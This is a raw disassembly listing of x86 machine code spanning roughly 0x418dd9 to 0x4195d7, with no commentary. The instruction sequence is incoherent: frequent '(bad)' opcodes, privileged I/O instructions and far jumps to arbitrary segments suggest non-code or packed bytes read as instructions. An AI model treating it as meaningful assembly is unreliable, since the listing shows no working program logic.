  418dd9:	loop   0x418da2
  418ddb:	mov    eax,0x89b5b46c
  418de0:	arpl   WORD PTR [ebp+0x4862a0d8],bx
  418de6:	inc    edi
  418de7:	outs   dx,BYTE PTR ds:[esi]
  418de8:	ror    WORD PTR [ebp-0x64],0x58
  418ded:	jp     0x418dd9
  418def:	into   
  418df0:	mov    esp,0x42bf32fb
  418df5:	mov    WORD PTR [edx+edi*4],?
  418df8:	push   es
  418df9:	fisubr DWORD PTR es:[eax-0x5f]
  418dfd:	cmp    esp,DWORD PTR [edi+0x68]
  418e00:	jo     0x418d87
  418e02:	mov    ds:0xd61057de,eax
  418e07:	pop    ds
  418e08:	daa    
  418e09:	mov    edi,?
  418e0b:	pop    ebx
  418e0c:	ins    BYTE PTR es:[edi],dx
  418e0d:	jns    0x418dcb
  418e0f:	pop    ebp
  418e10:	sbb    al,BYTE PTR [edx+edi*2-0x3ac92016]
  418e17:	int    0x95
  418e19:	aam    0xe5
  418e1b:	popf   
  418e1c:	add    eax,0xad29d5b7
  418e21:	push   esp
  418e22:	rol    BYTE PTR [esi-0x3cde1b9],0x94
  418e29:	adc    ch,cl
  418e2b:	mov    al,ds:0x46dadb01
  418e30:	jecxz  0x418e2b
  418e32:	xchg   ebp,eax
  418e33:	add    esp,DWORD PTR [edx+0x6]
  418e36:	push   esp
  418e37:	ror    dl,0xf0
  418e3a:	jl     0x418e14
  418e3c:	repz (bad) 
  418e3e:	je     0x418e38
  418e40:	mov    ebx,0xe6a348bf
  418e45:	stc    
  418e46:	dec    ebp
  418e47:	inc    ecx
  418e48:	cli    
  418e49:	retf   
  418e4a:	ror    DWORD PTR [ebx+0x7e],0x78
  418e4e:	or     al,0x95
  418e50:	sti    
  418e51:	pushf  
  418e52:	mov    esi,0x3e63361f
  418e57:	and    al,0xb4
  418e59:	movsx  eax,si
  418e5c:	push   edi
  418e5d:	or     eax,0xcb237656
  418e62:	xchg   ecx,ebx
  418e64:	xor    BYTE PTR [edx-0x4069f636],dl
  418e6a:	push   esi
  418e6b:	hlt    
  418e6c:	sbb    eax,0xdc28684b
  418e71:	xor    ecx,DWORD PTR [ecx-0x10]
  418e74:	sub    al,0xa1
  418e76:	lds    edi,FWORD PTR [edi-0x5c3b995a]
  418e7c:	sub    BYTE PTR [ebx-0x6b069662],dl
  418e82:	push   0xffffff9c
  418e84:	lods   al,BYTE PTR ds:[esi]
  418e86:	cmp    DWORD PTR [eax-0x1],ecx
  418e89:	iret   
  418e8a:	sbb    BYTE PTR [ebx-0xa787edf],0xbc
  418e91:	mov    edi,0x6884aafa
  418e96:	stos   DWORD PTR es:[edi],eax
  418e97:	mov    ecx,eax
  418e99:	sbb    DWORD PTR [edx+ecx*2+0x45],ebp
  418e9d:	lea    eax,[edx-0x7d]
  418ea0:	add    eax,0x4bda6cd9
  418ea5:	pop    es
  418ea6:	adc    eax,0xdf6f4119
  418eab:	es jmp 0x418ef6
  418eae:	dec    esp
  418eaf:	sar    DWORD PTR [esi+0x2b5624fc],0x10
  418eb6:	and    al,0xe4
  418eb8:	outs   dx,DWORD PTR ds:[esi]
  418eb9:	inc    esp
  418eba:	xor    DWORD PTR [eax],ecx
  418ebc:	cmp    al,0x63
  418ebe:	stos   DWORD PTR es:[edi],eax
  418ebf:	fisub  DWORD PTR [edx]
  418ec1:	adc    ebp,DWORD PTR [edx+0x7e6a2efd]
  418ec7:	mov    bh,0x30
  418ec9:	(bad)  
  418eca:	fcomp  DWORD PTR [ecx]
  418ecc:	inc    ecx
  418ecd:	nop
  418ece:	lods   al,BYTE PTR ds:[esi]
  418ecf:	cmp    dl,cl
  418ed1:	out    0x5e,eax
  418ed3:	xchg   esi,eax
  418ed4:	fidivr WORD PTR [ecx-0x7f5e028]
  418eda:	repnz fisubr WORD PTR [ecx]
  418edd:	xchg   ecx,eax
  418ede:	sub    BYTE PTR [eax+0x77],dl
  418ee1:	leave  
  418ee2:	mov    gs,WORD PTR [esi-0xe044b36]
  418ee8:	das    
  418ee9:	enter  0xb029,0x9
  418eed:	mov    ebx,0x999c299c
  418ef2:	loop   0x418e9e
  418ef4:	adc    DWORD PTR [eax],edi
  418ef6:	mov    eax,ds:0xea3490be
  418efb:	adc    eax,DWORD PTR [ebx]
  418efd:	call   0x44e4:0x6ff24fcf
  418f04:	inc    edi
  418f05:	out    0xe3,eax
  418f07:	pop    edx
  418f08:	sub    BYTE PTR [edi],dl
  418f0a:	mov    ah,0x48
  418f0c:	xor    DWORD PTR [ebp-0x7e7034a4],0xffffffde
  418f13:	mov    bh,0x4
  418f15:	idiv   BYTE PTR [ebp+0x355fe0a6]
  418f1b:	in     eax,0xb8
  418f1d:	aad    0x5a
  418f1f:	mov    esp,0xe700d908
  418f24:	add    BYTE PTR [esi+eax*8],bl
  418f27:	mov    ecx,0x3c802ee7
  418f2c:	mov    ds:0x83fc944c,eax
  418f31:	inc    edi
  418f32:	and    BYTE PTR [edi+0x51e2736d],bl
  418f38:	push   es
  418f39:	icebp  
  418f3a:	xor    ebx,DWORD PTR [eax]
  418f3c:	repz xor al,0x99
  418f3f:	mov    esp,0x236eaeb8
  418f44:	or     bh,bl
  418f46:	pop    es
  418f47:	pop    ecx
  418f48:	inc    edx
  418f49:	mov    bl,0x54
  418f4b:	(bad)  
  418f4c:	scas   eax,DWORD PTR es:[edi]
  418f4d:	jecxz  0x418faa
  418f4f:	jo     0x418efb
  418f51:	mov    edi,0x7069317
  418f56:	adc    esp,DWORD PTR [ebp+0x798436ed]
  418f5c:	into   
  418f5d:	jp     0x418f4c
  418f5f:	imul   edx,ecx,0x6c
  418f62:	fucomip st,st(1)
  418f64:	and    ebx,edi
  418f66:	pop    ecx
  418f67:	dec    esp
  418f68:	repnz adc dl,ah
  418f6b:	(bad)
  418f6e:	inc    edx
  418f6f:	outs   dx,BYTE PTR ds:[esi]
  418f70:	int    0x3b
  418f72:	inc    eax
  418f73:	jae    0x418f0f
  418f75:	mov    DWORD PTR [ebx],esi
  418f77:	push   esp
  418f78:	stos   DWORD PTR es:[edi],eax
  418f79:	inc    edx
  418f7a:	sar    DWORD PTR [ebp-0x4b459ab5],1
  418f80:	(bad)  
  418f81:	push   edi
  418f82:	in     eax,0x49
  418f84:	stc    
  418f85:	loopne 0x418fdb
  418f87:	jo     0x418fc6
  418f89:	mov    cl,0xb6
  418f8b:	sbb    al,0xa1
  418f8d:	push   esp
  418f8e:	fwait
  418f8f:	call   0x6bf62ced
  418f94:	add    BYTE PTR [eax-0x4589644c],ch
  418f9a:	pop    eax
  418f9c:	fwait
  418f9d:	xchg   DWORD PTR [edi-0x7d4c9292],ebx
  418fa3:	pop    es
  418fa4:	pop    ecx
  418fa5:	cmc    
  418fa6:	inc    ecx
  418fa7:	mov    ebx,0x5a235331
  418fac:	and    dl,dl
  418fae:	cmp    DWORD PTR ds:0xf3c200da,esp
  418fb4:	mov    ebx,0xf56eb057
  418fb9:	cmc    
  418fba:	stos   BYTE PTR es:[edi],al
  418fbb:	mov    edi,0x93240770
  418fc0:	mov    ds,WORD PTR [edi]
  418fc2:	push   ebp
  418fc3:	pop    eax
  418fc4:	ds fcom st(1)
  418fc7:	push   ds
  418fc8:	or     dl,bh
  418fca:	add    al,0x95
  418fcc:	sub    BYTE PTR [ebp+0x70],dh
  418fcf:	ret    0x45d
  418fd2:	or     eax,DWORD PTR [esi+0x52]
  418fd5:	pop    esp
  418fd6:	sub    al,0x3e
  418fd8:	retf   
  418fd9:	jo     0x41900c
  418fdb:	add    BYTE PTR [ecx-0x1a21cf5d],dl
  418fe1:	pop    esi
  418fe2:	ds mov esp,0x19747f3e
  418fe8:	lds    ebx,FWORD PTR [ebp+0x11]
  418feb:	ret    
  418fec:	rcl    BYTE PTR [eax],cl
  418fee:	adc    eax,0x5c0c850c
  418ff3:	rcl    BYTE PTR [edx-0x477722e],cl
  418ff9:	and    eax,DWORD PTR [ecx+0x53989af9]
  418fff:	inc    esi
  419000:	pop    ds
  419001:	jmp    0x418f83
  419003:	pop    eax
  419004:	or     eax,0x369f05c0
  419009:	jecxz  0x419077
  41900b:	pushf  
  41900c:	xchg   esi,eax
  41900d:	inc    ebp
  41900e:	popf   
  41900f:	div    BYTE PTR [ebx-0x794cf3ac]
  419015:	mov    dh,0x7a
  419017:	jecxz  0x41907b
  419019:	loopne 0x41902f
  41901b:	test   al,0xec
  41901d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41901e:	sti    
  41901f:	inc    ecx
  419020:	cmp    esi,DWORD PTR [ecx-0x11]
  419023:	pop    eax
  419024:	sub    DWORD PTR [ebx],0x6
  419027:	mov    ch,0xe0
  419029:	push   ds
  41902a:	ss pop ecx
  41902c:	xchg   BYTE PTR [esi+0x2d],ch
  41902f:	ror    DWORD PTR [eax+0x339dc6a5],1
  419035:	add    al,0x5
  419037:	and    BYTE PTR [esi+0x1aa83602],0x76
  41903e:	adc    al,0xe
  419040:	push   0xbc2b6500
  419045:	rcl    DWORD PTR [edx+0x22],cl
  419048:	push   cs
  419049:	dec    ebp
  41904a:	pop    esp
  41904b:	cld    
  41904c:	lods   al,BYTE PTR ds:[esi]
  41904d:	retf   0x7bd3
  419050:	xchg   esp,eax
  419051:	je     0x419031
  419053:	les    ebp,FWORD PTR [ebx+ebp*8-0x3e]
  419057:	aas    
  419058:	test   BYTE PTR ds:[ecx+0x54],bh
  41905c:	cwde   
  41905d:	mov    cl,0x7a
  41905f:	ret    0xee8f
  419062:	fnstsw WORD PTR [eax+0x7e7f860b]
  419068:	and    edi,DWORD PTR [esi-0x71]
  41906b:	mov    bh,0x36
  41906d:	ffree  st(2)
  41906f:	sub    al,0xbd
  419071:	(bad)  
  419072:	sbb    cl,BYTE PTR [edx+0x2e38102a]
  419078:	out    dx,eax
  419079:	sbb    BYTE PTR [ebp-0x16],ah
  41907c:	jmp    0x8195:0x4fd66b85
  419083:	jnp    0x4190d0
  419085:	adc    eax,0x35056027
  41908a:	hlt    
  41908b:	mov    esp,0x77c4bea9
  419090:	or     edi,eax
  419092:	dec    ecx
  419093:	shl    DWORD PTR [edi],0xf7
  419096:	data16 xor BYTE PTR [edi+0x2b28ac59],dl
  41909d:	int    0xc6
  41909f:	out    dx,eax
  4190a0:	inc    ecx
  4190a1:	outs   dx,BYTE PTR ds:[esi]
  4190a2:	fmul   st,st(4)
  4190a5:	test   eax,0xd0817241
  4190aa:	adc    BYTE PTR [eax],0x98
  4190ad:	test   BYTE PTR [edi-0x482871ad],0x46
  4190b4:	xchg   edx,eax
  4190b5:	xor    ah,0xc
  4190b8:	sbb    ch,BYTE PTR [edi]
  4190ba:	jmp    0x41905f
  4190bc:	push   es
  4190bd:	or     ecx,edi
  4190bf:	pop    esp
  4190c0:	sbb    esp,DWORD PTR [ecx-0x1d]
  4190c3:	and    BYTE PTR [ecx+0x53028e09],ch
  4190c9:	sub    al,ah
  4190cb:	cmp    BYTE PTR [ebx-0x6],0xf3
  4190cf:	sbb    ecx,eax
  4190d1:	addr16 inc edi
  4190d3:	out    0xc9,eax
  4190d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190d6:	jnp    0x4190b5
  4190d8:	mul    DWORD PTR [edi+0xf493aa2]
  4190de:	and    eax,0x6353d5ad
  4190e3:	xor    eax,0xa9604ed4
  4190e8:	mov    cl,al
  4190ea:	add    BYTE PTR [edi+0x58],0x12
  4190ee:	push   cs
  4190ef:	jmp    0xae81:0x4af7bb0
  4190f6:	pop    es
  4190f7:	or     BYTE PTR [esi+0x6895a20a],dh
  4190fd:	push   eax
  4190fe:	xchg   ebp,eax
  4190ff:	pslld  mm6,QWORD PTR [ecx]
  419102:	clc    
  419103:	xor    ch,0x54
  419106:	retf   0x41b4
  419109:	cmp    eax,0x2d3d56b1
  41910e:	hlt    
  41910f:	retf   0xef40
  419112:	and    dl,BYTE PTR [edi]
  419114:	adc    dh,0xf0
  419117:	xor    esi,edi
  419119:	jbe    0x41909b
  41911b:	add    BYTE PTR [edx+0x6c],cl
  41911e:	data16 test al,0x6b
  419121:	jmp    0x1cfcf0ab
  419126:	fnstsw WORD PTR [eax+0xe]
  419129:	mov    ah,0xf0
  41912b:	ret    0x2bd1
  41912e:	jno    0x419169
  419130:	add    eax,0xc5392d50
  419135:	push   edi
  419136:	xor    BYTE PTR [esi],0xa2
  419139:	push   eax
  41913a:	mov    al,0x35
  41913c:	popa   
  41913d:	jmp    0x336da196
  419142:	mov    DWORD PTR [ebp-0x19c7224d],esi
  419148:	popa   
  419149:	and    BYTE PTR [esi+0x14],0x59
  41914d:	neg    DWORD PTR [esi]
  41914f:	jmp    0x6e4c:0x6b3f1cc2
  419156:	and    DWORD PTR [edi],esi
  419158:	pop    eax
  419159:	scas   eax,DWORD PTR es:[edi]
  41915a:	and    dh,ch
  41915c:	sbb    eax,ebp
  41915e:	mov    BYTE PTR [ecx+0x26a24d9b],bh
  419164:	hlt    
  419165:	dec    ebp
  419166:	call   0x320b3690
  41916b:	dec    edx
  41916c:	mov    bh,0x45
  41916e:	or     BYTE PTR [esp+ebx*2-0x15198fef],bh
  419175:	or     DWORD PTR [ebx-0x3e],edx
  419178:	pop    ebp
  419179:	or     DWORD PTR [esi],0xffffffe2
  41917c:	rcl    DWORD PTR [edx],cl
  41917e:	jg     0x41916e
  419180:	aad    0xcd
  419182:	cwde   
  419183:	ds inc ebx
  419185:	mov    dl,0x82
  419187:	jp     0x4191e7
  419189:	or     eax,0xaf543809
  41918e:	daa    
  41918f:	push   cs
  419190:	ins    DWORD PTR es:[edi],dx
  419191:	loopne 0x41920f
  419193:	clc    
  419194:	pop    eax
  419195:	ret    0x9d53
  419198:	push   ebx
  419199:	das    
  41919a:	fwait
  41919b:	sub    DWORD PTR [edi],edx
  41919d:	sub    dl,bl
  41919f:	jp     0x41919a
  4191a1:	xchg   ebp,eax
  4191a2:	fcomp  DWORD PTR ds:0x2a08d107
  4191a8:	push   0x345dc419
  4191ad:	sub    esp,DWORD PTR [edx]
  4191af:	cwde   
  4191b0:	pusha  
  4191b1:	mov    dh,0x44
  4191b3:	pusha  
  4191b4:	cs xchg esp,eax
  4191b6:	push   ecx
  4191b7:	inc    esi
  4191b8:	data16 stos BYTE PTR es:[edi],al
  4191ba:	stos   BYTE PTR es:[edi],al
  4191bb:	push   eax
  4191bc:	(bad)  
  4191bd:	leave  
  4191be:	loope  0x41915b
  4191c0:	and    DWORD PTR [eax+0x234a48e5],ebp
  4191c6:	inc    esi
  4191c7:	or     DWORD PTR [edi+ebp*2+0x3e],ebx
  4191cb:	jmp    0x4191b9
  4191cd:	lds    ebp,FWORD PTR [ebx+0x7798dd74]
  4191d3:	ficom  WORD PTR [esi+0x65]
  4191d6:	imul   edi,DWORD PTR [ecx],0x69283010
  4191dc:	and    DWORD PTR [edi],edi
  4191de:	push   ecx
  4191df:	gs pop ebp
  4191e1:	mov    eax,0xdecdc145
  4191e6:	or     DWORD PTR [esi+0x168f3ee6],esp
  4191ec:	or     bh,BYTE PTR ds:0xda8fafb0
  4191f2:	cmp    edi,ecx
  4191f4:	cmc    
  4191f5:	out    dx,eax
  4191f6:	mov    ds:0xe62ca34,eax
  4191fb:	cmc    
  4191fc:	add    cl,BYTE PTR [ebx]
  4191fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ff:	push   ebx
  419200:	scas   eax,DWORD PTR es:[edi]
  419201:	stos   DWORD PTR es:[edi],eax
  419202:	outs   dx,DWORD PTR ds:[esi]
  419203:	minps  xmm4,XMMWORD PTR [eax-0x6376632f]
  41920a:	mov    ecx,0xfdfaa15
  41920f:	loope  0x419252
  419211:	pop    edx
  419212:	sahf   
  419213:	inc    ecx
  419214:	bound  ebx,QWORD PTR [ecx-0x7e]
  419217:	loopne 0x419284
  419219:	sti    
  41921a:	arpl   WORD PTR [ecx+ebp*4-0x18],bx
  41921e:	cdq    
  41921f:	sub    al,bl
  419221:	leave  
  419222:	sub    al,0x5a
  419224:	mov    BYTE PTR [edx],0x78
  419227:	ror    DWORD PTR [ebx+esi*1],1
  41922a:	aad    0xee
  41922c:	imul   edx,esp,0x93bd945a
  419232:	mov    ecx,0x3495f25c
  419237:	ins    DWORD PTR es:[edi],dx
  419238:	std    
  419239:	(bad)  
  41923b:	push   es
  41923c:	push   0x45746823
  419241:	dec    esi
  419242:	push   edi
  419243:	push   esp
  419244:	into   
  419245:	push   0x5c7e0490
  41924a:	je     0x4191ea
  41924c:	mov    ecx,0x230df5c6
  419251:	adc    ecx,DWORD PTR [ebx]
  419253:	cmp    cl,ah
  419255:	pop    esp
  419256:	xor    BYTE PTR [esi],bl
  419258:	dec    edi
  419259:	push   esp
  41925a:	out    dx,al
  41925b:	fnsave [esi-0x61]
  41925e:	out    0x4a,eax
  419260:	or     al,0xd6
  419262:	scas   al,BYTE PTR es:[edi]
  419263:	mov    cl,0x90
  419265:	jge    0x4192de
  419267:	jge    0x41927d
  419269:	fisubr WORD PTR [edi+0x58]
  41926c:	outs   dx,BYTE PTR ds:[esi]
  41926d:	xor    esp,esi
  41926f:	and    bl,BYTE PTR ds:[ebx-0x5]
  419273:	sbb    ebp,DWORD PTR [esp+edx*4+0x58]
  419277:	inc    ecx
  419278:	add    dh,bh
  41927a:	(bad)  
  41927b:	sub    eax,0xa14e3207
  419280:	test   eax,0x621b8bea
  419285:	and    cl,BYTE PTR [eax+0x29]
  419288:	mov    ds:0xbfc2d921,al
  41928d:	jb     0x41927f
  41928f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419290:	js     0x419223
  419292:	and    BYTE PTR [edx+0x51db6ba6],ah
  419298:	pop    ebx
  419299:	bound  esi,QWORD PTR [edx]
  41929b:	xor    al,0x13
  41929d:	(bad)  
  41929e:	and    bl,bh
  4192a0:	xchg   ebx,eax
  4192a1:	and    eax,0x1e5aac24
  4192a6:	(bad)  
  4192a7:	sub    ch,BYTE PTR [edi+0x18b5bd08]
  4192ad:	or     BYTE PTR [esp],ch
  4192b0:	sub    edx,DWORD PTR [edx+0xf4e2806]
  4192b6:	retf   
  4192b7:	dec    edx
  4192b8:	pop    ebx
  4192b9:	cmp    DWORD PTR [ebx+0x67bd3d21],edi
  4192bf:	mov    dl,0x6d
  4192c1:	lods   eax,DWORD PTR ds:[esi]
  4192c2:	outs   dx,BYTE PTR ds:[esi]
  4192c3:	call   0x17bcea64
  4192c8:	and    bh,BYTE PTR [eax+0x1c]
  4192cb:	ror    BYTE PTR [eax],1
  4192cd:	retf   
  4192ce:	mov    ds:0xfa2f6ac0,al
  4192d3:	les    edx,FWORD PTR [edi-0x75174186]
  4192d9:	dec    esp
  4192da:	and    al,0x8c
  4192dc:	xchg   ecx,eax
  4192dd:	call   0x705557b
  4192e2:	jbe    0x4192f5
  4192e4:	fist   WORD PTR [esi+0x49]
  4192e7:	xor    al,0x47
  4192e9:	fs push ebx
  4192eb:	jmpw   0x6c2c
  4192ef:	mov    ?,esp
  4192f1:	push   edi
  4192f2:	stos   BYTE PTR es:[edi],al
  4192f3:	imul   eax,ebp,0x3c88aca
  4192f9:	call   0x59b3:0x5e00d8fb
  419300:	push   esp
  419301:	mov    WORD PTR [eax],ds
  419303:	mov    DWORD PTR [ebp+0x40],ecx
  419306:	imul   cl
  419308:	cmp    esp,esp
  41930a:	rcr    al,1
  41930c:	fdiv   st(6),st
  41930e:	popf   
  41930f:	xchg   esp,eax
  419310:	aad    0x4f
  419312:	cmp    esp,DWORD PTR [esi-0x5030a5e0]
  419318:	push   ecx
  419319:	pop    edx
  41931a:	out    0xc4,eax
  41931c:	std    
  41931d:	sbb    al,0x9e
  41931f:	in     eax,dx
  419320:	sahf   
  419321:	xor    eax,0x8674b448
  419326:	sar    DWORD PTR [edi+eax*1-0x9],0x7b
  41932b:	inc    esp
  41932c:	push   0x7a
  41932e:	rol    BYTE PTR [edx],0x85
  419331:	sub    bl,BYTE PTR ds:0xc88a940
  419337:	adc    eax,0x59c6622e
  41933c:	js     0x4193a2
  41933e:	fsubrp st(0),st
  419340:	push   ds
  419341:	mov    ebp,0xe72df97c
  419346:	xor    DWORD PTR [edi+0xeb47225],edx
  41934c:	mov    DWORD PTR [esi+0x202fa728],0xc116e1da
  419356:	cmp    eax,0xbb892a3e
  41935b:	mov    eax,ds:0x1bcda91f
  419360:	aaa    
  419361:	sbb    BYTE PTR [edx-0x6c43bf8a],0xeb
  419368:	mov    ds,esp
  41936a:	test   BYTE PTR [ebx+0xa],bh
  41936d:	push   es
  41936e:	retf   
  41936f:	sbb    BYTE PTR [esi+0x1f],ch
  419372:	cwde   
  419373:	(bad)  
  419374:	(bad)  
  419376:	mov    ebp,0x3079b662
  41937b:	stc    
  41937c:	(bad)
  41937f:	cwde   
  419380:	leave  
  419381:	dec    esp
  419382:	mov    eax,0x93b11eb0
  419387:	mov    ds:0x4a7a4960,eax
  41938c:	pop    ds
  41938d:	out    0x58,eax
  41938f:	mov    ah,0x3e
  419391:	cmp    BYTE PTR [eiz*4-0x4230bf0f],ah
  419398:	pushf  
  419399:	jno    0x419386
  41939b:	(bad)  
  41939c:	adc    DWORD PTR [edx+edi*2],edx
  41939f:	imul   ebx,ebp,0x5fd45180
  4193a5:	fiadd  DWORD PTR [ebx+0x33]
  4193a8:	scas   al,BYTE PTR es:[edi]
  4193a9:	aaa    
  4193aa:	stc    
  4193ab:	jecxz  0x4193d6
  4193ad:	xor    bl,BYTE PTR [ebx-0x4058b6a1]
  4193b3:	imul   ebx,DWORD PTR [eax],0xffffff86
  4193b6:	pop    es
  4193b7:	out    0xe1,al
  4193b9:	push   edx
  4193ba:	sbb    edi,DWORD PTR [edi]
  4193bc:	int    0xd8
  4193be:	aas    
  4193bf:	test   DWORD PTR [ebx+0x56],edi
  4193c2:	inc    edx
  4193c3:	ret    0x3742
  4193c6:	push   0xc252d644
  4193cb:	adc    eax,DWORD PTR [ecx+0x71c4d35e]
  4193d1:	or     ebx,DWORD PTR [edi-0x1126a9d4]
  4193d7:	pop    esp
  4193d8:	push   es
  4193d9:	stc    
  4193da:	out    dx,al
  4193db:	and    eax,0xdebb13c7
  4193e0:	sbb    eax,0x57b05588
  4193e5:	sub    esi,edx
  4193e7:	push   eax
  4193e8:	pusha  
  4193e9:	or     edi,DWORD PTR [eax-0x380655cb]
  4193ef:	mov    eax,gs
  4193f1:	dec    edi
  4193f2:	push   0xffffff94
  4193f4:	push   eax
  4193f5:	bound  esi,QWORD PTR [esi+edx*2-0x3]
  4193f9:	jl     0x41944e
  4193fb:	test   al,0x5b
  4193fd:	mov    eax,0x9fa506a7
  419402:	int    0xd0
  419404:	repnz mov BYTE PTR [ebx],cl
  419407:	mov    WORD PTR [eax+eiz*4-0x4],ss
  41940b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41940c:	fnstcw WORD PTR [eax+esi*2+0x6b]
  419410:	jp     0x419482
  419412:	(bad)  
  419413:	push   esp
  419414:	std    
  419415:	jno    0x4193ac
  419417:	jns    0x41944b
  419419:	idiv   DWORD PTR [ebp+0x4c07f2f0]
  41941f:	add    BYTE PTR [edx+0x2d],ch
  419422:	or     al,0xde
  419424:	call   0x12ed:0xafbb21d3
  41942b:	jbe    0x4193de
  41942d:	std    
  41942e:	pusha  
  41942f:	fcmovbe st,st(6)
  419431:	jns    0x419430
  419433:	dec    esp
  419434:	pop    eax
  419435:	jecxz  0x419413
  419437:	imul   esp,DWORD PTR [ecx+0x43],0x17
  41943b:	test   ch,al
  41943d:	lods   eax,DWORD PTR ds:[esi]
  41943e:	ror    DWORD PTR [edx+0x10],cl
  419441:	fadd   st(6),st
  419443:	jb     0x419491
  419445:	add    ah,BYTE PTR [ecx-0x6e7030e7]
  41944b:	ror    BYTE PTR [esi+eax*2],1
  41944e:	inc    esi
  41944f:	mov    BYTE PTR [edi+ebp*4-0x6ee84867],ch
  419456:	mov    ds:0xf006ca12,eax
  41945b:	mov    bl,0x9e
  41945d:	ftst   
  41945f:	dec    edi
  419460:	or     DWORD PTR [edi-0x1],edi
  419463:	call   0x15ea:0xb480ae7e
  41946a:	inc    esp
  41946b:	xor    esi,DWORD PTR [edi-0x455fac8c]
  419471:	cmp    cl,BYTE PTR [ebx+0x33486faf]
  419477:	xlat   BYTE PTR ds:[ebx]
  419478:	mov    ch,0x53
  41947a:	ins    BYTE PTR es:[edi],dx
  41947b:	inc    ebp
  41947c:	cmp    esi,eax
  41947e:	in     al,0xea
  419480:	pop    ecx
  419481:	lock mov bl,0xed
  419484:	daa    
  419485:	mov    ecx,0x53b5e2aa
  41948a:	sub    bh,BYTE PTR [edi+0x44]
  41948d:	out    dx,al
  41948e:	cmp    al,0xd5
  419490:	retf   0x1260
  419493:	mov    BYTE PTR [edx+0x43],dh
  419496:	inc    ebp
  419497:	fs loope 0x4194f6
  41949a:	dec    edi
  41949b:	test   eax,0xbe800435
  4194a0:	cmp    BYTE PTR [ecx+eax*4+0x16],dh
  4194a4:	dec    ebx
  4194a5:	cmp    BYTE PTR [esi+0x27b60d1c],al
  4194ab:	xchg   esp,eax
  4194ac:	enter  0x6ba1,0xec
  4194b0:	dec    edx
  4194b1:	in     eax,dx
  4194b2:	out    dx,al
  4194b3:	push   eax
  4194b4:	mov    ah,0x59
  4194b6:	push   esi
  4194b7:	fisubr DWORD PTR [eax+0x44]
  4194ba:	jns    0x419493
  4194bc:	fwait
  4194bd:	xchg   ecx,eax
  4194be:	enter  0x5668,0x4e
  4194c2:	adc    BYTE PTR [edi+0x60],0xc6
  4194c6:	das    
  4194c7:	mov    al,dl
  4194c9:	xchg   edi,eax
  4194ca:	jb     0x41947b
  4194cc:	into   
  4194cd:	jne    0x419493
  4194cf:	in     eax,0x41
  4194d1:	push   0xffffffc6
  4194d3:	lods   al,BYTE PTR ds:[esi]
  4194d4:	(bad)  
  4194d5:	mov    eax,0x6a5b2089
  4194da:	add    DWORD PTR [ebx+0x50ff2fc5],ebx
  4194e0:	movsx  ebx,cx
  4194e3:	shl    dh,0x62
  4194e6:	mov    eax,0x84539965
  4194eb:	lods   eax,DWORD PTR ds:[esi]
  4194ec:	test   BYTE PTR [bx+0x4c],bh
  4194f0:	add    al,0x32
  4194f2:	or     al,cl
  4194f4:	pop    ebx
  4194f5:	jmp    DWORD PTR [edx]
  4194f7:	stos   DWORD PTR es:[edi],eax
  4194f8:	int3   
  4194f9:	xor    ebp,ebp
  4194fb:	cmp    al,0xf1
  4194fd:	sub    edx,DWORD PTR [eax-0x7]
  419500:	xor    BYTE PTR [eax+0x7c],dl
  419503:	mov    fs,WORD PTR [edx+0x23]
  419506:	into   
  419507:	cmp    ecx,DWORD PTR [ebx+0x5b]
  41950a:	jmp    0x8497:0xc1e5c34f
  419511:	sbb    bl,cl
  419513:	nop
  419514:	pushf  
  419515:	xchg   dh,bl
  419517:	dec    edi
  419518:	es inc esp
  41951a:	sbb    eax,0x6d3a9239
  41951f:	(bad)  
  419520:	jg     0x419521
  419522:	and    dh,ah
  419524:	push   0x2f
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	push   esp
  419528:	hlt    
  419529:	ss out 0xa1,al
  41952c:	mov    ebx,DWORD PTR [edx+0x71553663]
  419532:	mov    edx,0x3d88172d
  419537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419538:	sbb    eax,0xdbc1fe94
  41953d:	shl    bh,cl
  41953f:	imul   dh
  419541:	popf   
  419542:	sbb    ch,al
  419544:	xor    DWORD PTR [edi+0x7a],edx
  419547:	pop    esp
  419548:	retf   0xaa
  41954b:	sbb    ecx,DWORD PTR [edx]
  41954d:	sbb    eax,0xbe487426
  419552:	retf   
  419553:	mov    WORD PTR [ebx+ecx*2+0x4c],fs
  419557:	ss in  eax,dx
  419559:	sub    eax,0x69c089c6
  41955e:	add    ecx,esp
  419560:	inc    ebp
  419561:	test   eax,0xa0b9eca9
  419566:	or     DWORD PTR [ecx-0xb59fb3b],eax
  41956c:	xor    eax,0xc41c99fd
  419571:	mov    bh,0x7b
  419573:	xchg   esp,eax
  419574:	cmp    eax,0xfdacb28f
  419579:	cwde   
  41957a:	dec    edx
  41957b:	push   ebx
  41957c:	stos   DWORD PTR es:[edi],eax
  41957d:	nop
  41957e:	and    cl,BYTE PTR [edi]
  419580:	inc    ecx
  419581:	and    bl,al
  419583:	sbb    DWORD PTR [esi-0x1d],eax
  419586:	adc    al,0xcd
  419588:	not    bl
  41958a:	sbb    al,0xde
  41958c:	out    0x4f,al
  41958e:	mov    dh,0x97
  419590:	icebp  
  419591:	cmp    BYTE PTR [ebx-0x48e4adab],dl
  419597:	xlat   BYTE PTR ds:[ebx]
  419598:	xchg   esi,eax
  419599:	popf   
  41959a:	bound  esp,QWORD PTR [edx+0x206dd52b]
  4195a0:	(bad)  
  4195a1:	call   DWORD PTR [ecx]
  4195a3:	cmp    ebp,0x64d99f3a
  4195a9:	xchg   edi,eax
  4195aa:	inc    ebp
  4195ab:	ja     0x419546
  4195ad:	dec    ebp
  4195ae:	ds scas eax,DWORD PTR es:[edi]
  4195b0:	fmul   QWORD PTR [edi]
  4195b2:	adc    ch,BYTE PTR [edx-0x77f85862]
  4195b8:	in     eax,dx
  4195b9:	aaa    
  4195ba:	sub    bh,BYTE PTR [esi]
  4195bc:	rcr    esi,1
  4195be:	retf   0x2b0
  4195c1:	sub    DWORD PTR [ebx],esi
  4195c3:	inc    ecx
  4195c4:	ins    BYTE PTR es:[edi],dx
  4195c5:	clc    
  4195c6:	inc    edi
  4195c7:	and    DWORD PTR [ebp-0x4b],ecx
  4195ca:	ds cwde 
  4195cc:	les    ebx,FWORD PTR [esi-0x12db78d2]
  4195d2:	sbb    eax,0x9ede2d98
  4195d7:	cmp    eax,0xe93db01e
